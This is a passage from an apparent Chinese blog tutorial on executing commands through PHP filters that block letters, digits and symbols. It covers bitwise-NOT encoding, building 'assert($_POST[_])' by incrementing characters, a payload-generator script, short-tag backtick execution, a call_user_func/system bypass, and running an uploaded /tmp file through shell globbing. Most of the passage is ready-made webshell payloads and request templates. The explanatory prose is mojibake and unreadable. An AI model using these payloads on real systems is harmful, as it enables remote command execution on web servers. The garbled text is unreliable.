<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;(\&quot;&quot;</span>+t1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+t2+<span class="hljs-string">&quot;\&quot;)&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="å–å"><a href="#å–å" class="headerlink" title="å–å"></a>å–å</h2><p>~() ä¼šå¯¹æ‹¬å·é‡Œé¢çš„ä¸œè¥¿è¿›è¡Œä¸€ä¸ªå–å  å¦‚æœåŸæœ¬æ˜¯0b1001  ç»è¿‡å–ååæ˜¯ 0b0110</p><p><img src="https://s2.loli.net/2023/08/25/hNUTOxH4enmrPLQ.png" alt="image-20230706221417162.png"></p><p>æœ‰ä¸­æ–‡çš„ä¹Ÿæœ‰urlç¼–ç çš„  </p><p>ä¸‹é¢ç”¨urlçš„æ¥è®²ä¸€ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2023/08/25/6egkZrpwcUoJICP.png" alt="image-20230706222401719.png"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_=assert $__=_POST      ä¸ç”¨åœ¨å†urläº†   è¿™ä¸ªæ˜¯åœ¨php5ä¸‹<br></code></pre></td></tr></table></figure><p>è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;_POST&quot;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>php7ä¸‹æ˜¯åå¼•å· è¿›è¡Œåå¼¹shell</p><h2 id="è‡ªå¢"><a href="#è‡ªå¢" class="headerlink" title="è‡ªå¢"></a>è‡ªå¢</h2><p>å…ˆæ¥ä¸€ä¸ªç®€å•çš„ä»£ç æ¥ç†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯è‡ªå¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;A&#x27;</span>;<br>++<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-comment">//è¿è¡Œç»“æœæ˜¯B</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ª++ä¹‹å‰cè¯­è¨€çš„æ—¶å€™å°±å­¦ä¹ è¿‡äº† æˆ‘ä»¬å¦‚æœè·å–åˆ°äº†é¦–å­—æ¯Açš„è¯é‚£ä¹ˆä»»æ„ä¸€ä¸ªå­—æ¯æˆ‘ä»¬éƒ½å¯ä»¥é€šè¿‡è‡ªå¢çš„æ–¹æ³•æ¥è·å–</p><p>ä½†æ˜¯åœ¨æ— æ•°å­—å­—æ¯ä¸­æˆ‘ä»¬ä¸èƒ½æœ‰å­—æ¯ é‚£ä¹ˆè¯¥å¦‚ä½•è·å–Aå‘¢ï¼Ÿ è¿™é‡Œè¦ç”¨åˆ°äº†æ•°ç»„ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=[];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;   <span class="hljs-comment">//è¿è¡Œç»“æœæ˜¯Array</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬è·å¾—çš„æ˜¯æ•´ä¸ªæ•°ç»„ å®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸² æ‰€ä»¥å•ä¸€ä¸ªå­—æ¯Aæˆ‘ä»¬æ˜¯æ‹¿ä¸åˆ°çš„ è¿™é‡Œåœ¨æ•°ç»„åé¢åŠ ä¸€ä¸ªâ€™â€™ è¿™æ ·å°±ä¼šè¢«å½“ä½œå­—ç¬¦ä¸²äº† </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]; <br><span class="hljs-comment">//è¿è¡Œç»“æœæ˜¯A</span><br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ æ—¢ç„¶æ˜¯æ— æ•°å­—å­—æ¯çš„è¯ è¿™ä¸ª0å°±ä¸åº”è¯¥æœ‰äº† æˆ‘ä»¬æ‰¾ä¸€ä¸ªä¸å­˜åœ¨çš„å˜é‡ ä¸ºå‡ ä¹Ÿå°±æ˜¯0 è¿™æ ·å°±å¯ä»¥ä»£æ›¿äº†   ç„¶åå˜é‡åç”¨_ æ¥ä»£æ›¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-comment">//è¿è¡Œç»“æœæ˜¯A</span><br></code></pre></td></tr></table></figure><p>åœ¨php5ä¸­æˆ‘ä»¬å¯ä»¥ç”¨<code>assert($_POST[_])</code> æ¥è¿›è¡Œä¸€ä¸ªå‘½ä»¤æ‰§è¡Œ</p><p>ç„¶åè¿™ä¸ªassertå’Œ_POST  éƒ½å¯ä»¥åˆ©ç”¨è‡ªå¢è¿›è¡Œæ„é€ å‡ºæ¥</p><p>ä¸‹é¢è®²ä¸€ä¸‹æ„é€ çš„æ€è·¯ </p><p>ä¸Šé¢çš„æ—¢ç„¶å¯ä»¥è¿ç®—å‡ºA æˆ‘ä»¬ä¹Ÿå¯ä»¥è¿ç®—å‡ºS å‰ç½®æ˜¯å…ˆæŠŠAè¿™ä¸ªå€¼èµ‹ç»™å‡ ä¸ªå˜é‡ æ–¹ä¾¿åç»­çš„æ„é€ </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];   è¿™ä¸ªä¸‰ä¸ªä¸‹åˆ’çº¿çš„è¢«èµ‹å€¼æˆäº†A<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;  <br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;    <span class="hljs-regexp">//</span>ç„¶åä¸¤ä¸ªä¸‹åˆ’çº¿çš„å’Œä¸€ä¸ªä¸‹åˆ’çº¿çš„éƒ½è¢«èµ‹å€¼æˆäº†A  è¿™é‡Œæ˜¯ä¸ºä»€ä¹ˆ ä¸‹é¢æ‹¼æ¥çš„æ—¶å€™å°±èƒ½çœ‹å‡ºä½œç”¨äº† <br></code></pre></td></tr></table></figure><p>OK ä¸‹é¢å°±æ¥æ„é€ Så§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_</span>;<br>è¿™ä¸ª<span class="hljs-variable">$_</span> å°±æ˜¯S ä¸Šé¢é‚£äº›å°±æ˜¯ä¸€ä¸ªå¢åŠ çš„  ä»Aåˆ°S<br></code></pre></td></tr></table></figure><p>ç„¶åå…ˆæ„é€ ASS   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$__</span>;<br></code></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬è¦æ„é€ Eçš„è¯é¦–å…ˆè¦æŠŠ$_ é‡æ–°å®šä¹‰æˆA ä¸Šé¢å¾—$___ å®ƒå¾—å€¼è¿˜æ²¡æœ‰å˜ æ ¹æ®è¿™ä¸ª æŠŠ<code>$_</code>é‡æ–°å®šä¹‰æˆA</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$__</span>;<br><br></code></pre></td></tr></table></figure><p>ä¸‹é¢çš„éƒ½æ˜¯é‚£æ · å°±ä¸å†å¤šè¯´äº†</p><p>ç„¶åä¸‹é¢æœ‰ä¸€ä¸ªè‡ªå¢æ„é€ çš„è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-variable">$cmd2</span> = <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;post&#x27;</span>]);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">POC</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable">$POC_pat1</span> = <span class="hljs-string">&quot;\$__=\$___;&quot;</span>;<br>    <span class="hljs-variable">$POC_pat2</span> = <span class="hljs-string">&quot;\$_ .=\$__;&quot;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$POC1</span> = <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$str1</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>)-<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;A&quot;</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-variable">$POC_pat3</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat3</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str1</span>==<span class="hljs-variable">$str2</span>)&#123;<br>                <span class="hljs-variable">$POC_pat5</span> = <span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat5</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$POC_pat6</span> = <span class="hljs-variable">$POC_pat1</span>.<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>).<span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat6</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$i</span>++;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">POC2</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$____ = &quot;_&quot;;$__=$___;&#x27;</span>;<br>    <span class="hljs-variable">$POC_pat1</span> = <span class="hljs-string">&quot;\$__=\$___;&quot;</span>;<br>    <span class="hljs-variable">$POC_pat2</span> = <span class="hljs-string">&quot;\$____ .=\$__;&quot;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$POC1</span> = <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$str1</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>)-<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;A&quot;</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-variable">$POC_pat3</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>).<span class="hljs-variable">$POC_pat2</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat3</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str1</span>==<span class="hljs-variable">$str2</span>)&#123;<br>                <span class="hljs-variable">$POC_pat5</span> = <span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat5</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$POC_pat6</span> = <span class="hljs-variable">$POC_pat1</span>.<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>).<span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat6</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$i</span>++;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-variable">$POC_pat7</span> = <span class="hljs-string">&quot;\$_=[].&#x27;&#x27;;\$___=\$_[\$__];\$__=\$___;\$_=\$___;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat7</span>;<br>    <span class="hljs-title function_ invoke__">POC</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$cmd2</span>))&#123;<br>    <span class="hljs-title function_ invoke__">POC2</span>(<span class="hljs-variable">$cmd2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœè¦æ„é€ <code>assert($_POST[_])</code> çš„è¯ å°±è®©cmd=assert post=POST</p><p>æœ‰å››ä¸ªä¸‹åˆ’çº¿çš„æ˜¯postçš„ ä¸€ä¸ªä¸‹åˆ’çº¿çš„æ˜¯cmdçš„</p><h1 id="ç‰¹æ®Šç¬¦å·è¿‡æ»¤"><a href="#ç‰¹æ®Šç¬¦å·è¿‡æ»¤" class="headerlink" title="ç‰¹æ®Šç¬¦å·è¿‡æ»¤"></a>ç‰¹æ®Šç¬¦å·è¿‡æ»¤</h1><h3 id="1-å¯¹ä¸‹åˆ’çº¿è¿›è¡Œä¸€ä¸ªè¿‡æ»¤"><a href="#1-å¯¹ä¸‹åˆ’çº¿è¿›è¡Œä¸€ä¸ªè¿‡æ»¤" class="headerlink" title="1.å¯¹ä¸‹åˆ’çº¿è¿›è¡Œä¸€ä¸ªè¿‡æ»¤"></a><strong>1.å¯¹ä¸‹åˆ’çº¿è¿›è¡Œä¸€ä¸ªè¿‡æ»¤</strong></h3><p>è¿™ä¸ªå¯ä»¥åˆ©ç”¨çŸ­æ ‡ç­¾è¿›è¡Œä¸€ä¸ªç»•è¿‡</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`$_GET[_]`</span><span class="hljs-string">?&gt;</span>  å¯ä»¥å°†_GETè¿›è¡Œä¸€ä¸ªå–å ç„¶å å°†_ä¹Ÿè¿›è¡Œä¸€ä¸ªå–å <br><br>è½¬æ¢æˆ=&gt;  <span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span>&#123;<span class="hljs-variable">$&#123;</span>~<span class="hljs-string">&quot;å–ååçš„å­—ç¬¦&quot;</span>&#125;[%a0]&#125;<span class="hljs-string">?&gt;</span>   ç„¶åå°±å¯ä»¥è¿›è¡Œä¸€ä¸ªå‘½ä»¤æ‰§è¡Œ  åŒæ—¶æ”¹æˆ<span class="hljs-variable constant_">POST</span>ä¹Ÿæ˜¯å¯ä»¥çš„ åªä¸è¿‡å°†åé¢çš„å‚æ•°æ¢æˆä¸€ä¸ª - å·å°±è¡Œäº†<br></code></pre></td></tr></table></figure><p>å½“ç„¶å¼‚æˆ–ä¹Ÿæ˜¯å¯ä»¥çš„</p><h3 id="2-ä¸‹åˆ’çº¿å’Œ-è¢«è¿‡æ»¤äº†"><a href="#2-ä¸‹åˆ’çº¿å’Œ-è¢«è¿‡æ»¤äº†" class="headerlink" title="2.ä¸‹åˆ’çº¿å’Œ$è¢«è¿‡æ»¤äº†"></a><strong>2.ä¸‹åˆ’çº¿å’Œ$è¢«è¿‡æ»¤äº†</strong></h3><p><strong>php7ä¸‹ï¼š</strong></p><p>åˆ©ç”¨å‡½æ•°<strong>call_user_func()</strong>  è¿›è¡Œä¸€ä¸ªç»•è¿‡   åªåœ¨php7åæœ‰æ•ˆ($a)();</p><p>call_user_func(â€˜è°ƒç”¨çš„å‡½æ•°â€™,â€™ä¼ å…¥çš„å€¼â€™)</p><p>å¯¹å®ƒè¿›è¡Œä¸€ä¸ªå–åç»•è¿‡</p><p>call_user_func =&gt; %9C%9E%93%93%A0%8A%8C%9A%8D%A0%99%8A%91%9C</p><p>system =&gt; %8C%86%8C%8B%9A%92</p><p>ls =&gt; %93%8C</p><p>(<del>%9C%9E%93%93%A0%8A%8C%9A%8D%A0%99%8A%91%9C)(</del>%8C%86%8C%8B%9A%92,~%93%8C);  =&gt;(call_user_func)(system,ls);</p><p><img src="https://s2.loli.net/2023/08/25/9kGCNawZQonDh1U.png" alt="image-20230707160430309.png"></p><p><strong>åœ¨php5ä¸‹ï¼š</strong></p><p>åˆ©ç”¨äº†ä¸€ä¸ªä¸Šä¼ ä¸´æ—¶æ–‡ä»¶</p><p>å‚è€ƒå¤§ä½¬åšå®¢ï¼š<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>. file(æ–‡ä»¶å) æ˜¯ç”¨æ¥æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶çš„  </p><p>è¿™ä¸ªåœ¨php5ä¸‹çš„ç»•è¿‡æ€è·¯å°±æ˜¯ ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ phpä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶é»˜è®¤ä¿å­˜åœ¨/tmp/phpxxxxxxç›®å½•ä¸‹ ï¼ˆxxxxxx æ˜¯å…­ä¸ªéšæœºçš„å¤§å°å†™å­—æ¯ï¼‰</p><p>ç„¶åæˆ‘ä»¬é€šè¿‡é€šé…ç¬¦? åˆ©ç”¨.file å»è¯»å–æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶  è¿™ä¸ªä¸Šä¼ çš„æ–‡ä»¶æ˜¯å¯æ§çš„ æ‰€ä»¥å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ   å¤§ä½“æ€è·¯å°±æ˜¯è¿™ä¸ª</p><p>? ä»£è¡¨ä»»æ„ä¸€ä¸ªå­—ç¬¦    </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-string">``</span>å¯ä»¥ç”¨æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ     <span class="hljs-string">`./???/?????????`</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªæœ‰ä¸å¯é¢„çŸ¥æ€§ å¯ä»¥æŸ¥çš„èŒƒå›´å¤ªå¹¿äº†    æˆ‘ä»¬æ³¨æ„åˆ°åé¢çš„xxxxxxæ˜¯å…­ä½éšæœºçš„å¤§å°å†™å­—æ¯ åœ¨linuxä¸­ globæ”¯æŒåˆ©ç”¨ [0-9]æ¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´</p><p>åœ¨asciiç è¡¨ä¸­  @-[  è¡¨ç¤ºæ‰€æœ‰å¤§å†™å­—æ¯çš„èŒƒå›´ æ‰€ä»¥å¯ä»¥åˆ©ç”¨  [@-[]   æˆ‘ä»¬å¯ä»¥è®©æœ€åä¸€ä½æ˜¯å¤§å†™çš„ç„¶åè¿™æ ·èŒƒå›´å°±è¿›ä¸€æ­¥çš„ç¼©å°äº†</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">`.<span class="hljs-regexp">/???/</span>?????[@-[]`<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/25/6l8qaihbTgDzH4P.png" alt="image-20230707175309732.png"></p><p>ä»User-Agentåˆ°æœ€åçš„è¯å¯ä»¥å¤åˆ¶ç²˜è´´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">79.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">79.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Content-Type:multipart/form-data;boundary=--------123</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 